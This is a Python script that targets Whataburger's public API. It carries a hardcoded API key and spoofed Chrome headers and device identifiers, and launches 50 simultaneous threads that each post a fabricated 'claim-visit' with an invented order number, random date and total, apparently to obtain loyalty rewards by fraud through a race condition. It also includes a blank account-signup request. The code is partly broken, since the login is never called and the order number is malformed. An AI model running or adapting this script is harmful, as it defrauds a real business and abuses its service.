import requests
import threading
import random


def main():
    s = requests.Session()
    s.headers = {
        'authority': 'api.whataburger.com',
        'accept': 'application/json',
        'accept-language': 'en,en-US;q=0.9,es;q=0.8',
        'cache-control': 'no-cache',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'dnt': '1',
        'origin': 'https://whataburger.com',
        'referer': 'https://whataburger.com/',
        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        'x-api-key': 'E08F3550-23FE-4360-BD6C-08314E6C3E2F',
        'x-client': 'SPA',
        'x-device-fingerprint': 'a558c392fc23b55329ddeb8c800a06b2',
        'x-device-id': '6ef4e14c-1ab6-8098-a62d-12736afa19cb',
        'x-device-platform': 'dotcom',
    }

    def log():
        res = s.post('https://api.whataburger.com/v2.4/accounts/login', json=json_data)
        auth_token = res.json()['tokenInfo']['accessToken']
        s.headers.update({'Authorization': 'Bearer {}'.format(auth_token)})

    def visit():

        jsonData = {
            'orderNumber': '2000{}'.format(111, 999),
            'orderDate': '2022-11-{}T07:00:00.000Z'.format(random.randint(10, 30)),
            'orderTotal': 10,
            'locationId': 1010,
        }

        s.headers.update({'Authorization': 'Bearer {}'.format('')})
        res_response = s.post('https://api.whataburger.com/v2.4/me/orders/claim-visit', json=jsonData)

        print(res_response.text)

    thread_list = []
    for i in range(50):
        thread_list.append(threading.Thread(target=visit))
    for x in thread_list:
        x.start()

    # take auth token from account
    #   make function that claims visit
    #   create thread pool (import threading)
    #   make list with a bunch of threads
    #   start all threads at once

    # create threads with range(40)
    # append them to a list
    # for i in list: start thread

    json_data = {
        'firstname': '',
        'lastname': '',
        'email': '',
        'zipcode': '',
        'password': '',
        'hasSubcribedToEmail': False,
        'phoneNumber': None,
        'confPW': '',
    }

    response = requests.post('https://api.whataburger.com/v2.4/accounts/signup', json=json_data)


if __name__ == "__main__":
    main()
